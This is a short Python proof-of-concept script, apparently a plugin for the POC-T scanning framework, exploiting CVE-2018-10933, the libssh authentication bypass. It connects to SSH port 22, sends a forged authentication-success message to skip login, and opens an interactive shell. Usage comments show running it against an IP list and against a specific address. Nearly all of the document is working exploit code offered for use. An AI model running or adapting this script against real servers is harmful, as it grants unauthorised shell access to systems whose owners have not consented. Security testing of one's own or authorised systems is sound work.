#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T

#cve-2018-10933

#gzaq

#greekn

#2018/10/18/

#POC-T.py -s cve-2018-10933 -iF iplist.txt -eG

#POC-T.py -s cve-2018-10933 -iS 166.156.121.24

import paramiko
import socket

def poc(url):
  print '[*] %s' % url
  sock = socket.socket()
  try:
      sock.connect((url, int(22)))

      # instantiate transport
      m = paramiko.message.Message()
      transport = paramiko.transport.Transport(sock)
      transport.start_client()

      m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
      transport._send_message(m)

      cmd_channel = transport.open_session()
      cmd_channel.invoke_shell()
      return 0

  except socket.error as e:
      print('[-] Connecting to host failed. Please check the specified host and port.')
      return 1

